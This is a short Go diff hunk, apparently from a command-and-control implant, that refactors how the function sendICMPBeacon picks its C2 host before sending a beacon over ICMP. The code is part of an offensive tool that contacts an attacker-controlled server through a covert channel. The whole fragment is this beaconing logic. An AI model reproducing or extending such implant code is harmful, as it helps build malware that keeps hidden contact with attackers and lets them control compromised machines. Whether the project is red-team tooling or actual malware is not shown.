@@ -34,10 +34,11 @@ func sendICMPBeacon(body []byte) []byte {
 	if C2URL == "" {
 		return nil
 	}
-	host := C2URL
-	if urls := c2URLsSnapshot(); len(urls) > 0 {
-		host = c2URLAtIndex(int(currentC2Idx.Load()))
+	hostPort, _, ok := currentC2Dial()
+	if !ok {
+		return nil
 	}
+	host := hostnameFromHostPort(hostPort)
 
 	ips, err := net.LookupIP(host)
 	if err != nil || len(ips) == 0 {
